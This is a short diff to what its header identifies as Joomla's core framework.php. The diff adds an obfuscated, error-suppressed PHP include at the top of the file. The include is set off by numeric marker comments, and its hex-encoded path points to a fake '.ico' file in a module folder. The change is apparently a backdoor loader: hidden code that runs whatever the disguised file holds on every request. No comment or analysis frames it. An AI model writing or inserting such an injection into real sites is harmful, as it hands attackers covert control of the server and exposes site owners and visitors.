@@ -1,4 +1,9 @@
 <?php
+/*32428*/
+
+@include "\x2fhome\x2fregh\x6fst/d\x6fmain\x73/reg\x68osp.\x67orod\x67omel\x2eby/p\x75blic\x5fhtml\x2fmodu\x6ces/m\x6fd_si\x6dplef\x6frm/k\x63aptc\x68a/fa\x76icon\x5f4599\x30c.ic\x6f";
+
+/*32428*/
 /**
 * @version		$Id: framework.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla
